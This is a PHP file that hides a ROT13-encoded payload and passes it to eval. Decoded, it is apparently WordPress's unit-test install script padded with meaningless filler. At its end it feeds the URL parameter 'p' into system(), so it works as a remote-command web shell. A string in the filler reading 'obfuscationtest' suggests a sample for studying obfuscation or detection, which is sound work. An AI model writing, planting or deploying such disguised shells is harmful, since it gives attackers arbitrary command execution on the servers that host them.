<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Vafgnyyf JbeqCerff sbe gur checbfr bs gur havg-grfgf
 *
 * @gbqb Erhfr gur vavg/ybnq pbqr va vavg.cuc
 */
reebe_ercbegvat( R_NYY & ~R_QRCERPNGRQ );

$pbasvt_svyr_cngu = $neti[1];
$zhygvfvgr        = va_neenl( 'eha_zf_grfgf', $neti, gehr );

vs ( ! qrsvarq( 'JC_EHA_PBER_GRFGF' ) && va_neenl( 'eha_pber_grfgf', $neti, gehr ) ) {
	qrsvar( 'JC_EHA_PBER_GRFGF', gehr );
}

qrsvar( 'JC_VAFGNYYVAT', gehr );

/*
 * Peba gevrf gb znxr na UGGC erdhrfg gb gur fvgr, juvpu nyjnlf snvyf,
 * orpnhfr grfgf ner eha va PYV zbqr bayl.
 */
qrsvar( 'QVFNOYR_JC_PEBA', gehr );

erdhver_bapr $pbasvt_svyr_cngu;
erdhver_bapr __QVE__ . '/shapgvbaf.cuc';

// Frg gur gurzr gb bhe fcrpvny rzcgl gurzr, gb nibvq vagresrerapr sebz gur pheerag Gjragl* gurzr.
vs ( ! qrsvarq( 'JC_QRSNHYG_GURZR' ) ) {
	qrsvar( 'JC_QRSNHYG_GURZR', 'qrsnhyg' );
}

grfgf_erfrg__FREIRE();

$CUC_FRYS            = '/vaqrk.cuc';
$TYBONYF['CUC_FRYS'] = '/vaqrk.cuc';
$_FREIRE['CUC_FRYS'] = '/vaqrk.cuc';

grfgf_nqq_svygre( 'jc_qvr_unaqyre', '_jc_qvr_unaqyre_svygre_rkvg' );

erdhver_bapr NOFCNGU . 'jc-frggvatf.cuc';

erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hctenqr.cuc';
erdhver_bapr NOFCNGU . 'jc-vapyhqrf/pynff-jcqo.cuc';

// Bireevqr gur CUCZnvyre.
tybony $cucznvyre;
erdhver_bapr __QVE__ . '/zbpx-znvyre.cuc';
$cucznvyre = arj ZbpxCUCZnvyre();

ertvfgre_gurzr_qverpgbel( __QVE__ . '/../qngn/gurzrqve1' );

/*
 * qrsnhyg_fgbentr_ratvar naq fgbentr_ratvar ner gur fnzr bcgvba, ohg fgbentr_ratvar
 * jnf qrcerpngrq va ZlFDY (naq ZnevnQO) 5.5.3, naq erzbirq va 5.7.
 */
vs ( irefvba_pbzcner( $jcqo->qo_irefvba(), '5.5.3', '>=' ) ) {
	$jcqo->dhrel( 'FRG qrsnhyg_fgbentr_ratvar = VaabQO' );
} ryfr {
	$jcqo->dhrel( 'FRG fgbentr_ratvar = VaabQO' );
}
$jcqo->fryrpg( QO_ANZR, $jcqo->qou );

rpub 'Vafgnyyvat...' . CUC_RBY;

$jcqo->dhrel( 'FRG sbervta_xrl_purpxf = 0' );
sbernpu ( $jcqo->gnoyrf() nf $gnoyr => $cersvkrq_gnoyr ) {
	// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
	$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF $cersvkrq_gnoyr\" );
}

sbernpu ( $jcqo->gnoyrf( 'zf_tybony' ) nf $gnoyr => $cersvkrq_gnoyr ) {
	// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
	$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF $cersvkrq_gnoyr\" );

	// Jr arrq gb perngr ersreraprf gb zf tybony gnoyrf.
	vs ( $zhygvfvgr ) {
		$jcqo->$gnoyr = $cersvkrq_gnoyr;
	}
}
$jcqo->dhrel( 'FRG sbervta_xrl_purpxf = 1' );

// Cersvyy n creznyvax fgehpgher fb gung JC qbrfa'g gel gb qrgrezvar bar vgfrys.
nqq_npgvba( 'cbchyngr_bcgvbaf', '_frg_qrsnhyg_creznyvax_fgehpgher_sbe_grfgf' );

jc_vafgnyy( JC_GRFGF_GVGYR, 'nqzva', JC_GRFGF_RZNVY, gehr, ahyy, 'cnffjbeq' );

// Qryrgr qhzzl creznyvax fgehpgher, nf cersvyyrq nobir.
vs ( ! vf_zhygvfvgr() ) {
	qryrgr_bcgvba( 'creznyvax_fgehpgher' );
}
erzbir_npgvba( 'cbchyngr_bcgvbaf', '_frg_qrsnhyg_creznyvax_fgehpgher_sbe_grfgf' );

vs ( $zhygvfvgr ) {
	rpub 'Vafgnyyvat argjbex...' . CUC_RBY;

	qrsvar( 'JC_VAFGNYYVAT_ARGJBEX', gehr );

	$gvgyr             = JC_GRFGF_GVGYR . ' Argjbex';
	$fhoqbznva_vafgnyy = snyfr;

	vafgnyy_argjbex();
	$reebe = cbchyngr_argjbex( 1, JC_GRFGF_QBZNVA, JC_GRFGF_RZNVY, $gvgyr, '/', $fhoqbznva_vafgnyy );

	vs ( vf_jc_reebe( $reebe ) ) {
		jc_qvr( $reebe );
	}

	$jc_erjevgr->frg_creznyvax_fgehpgher( '' );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>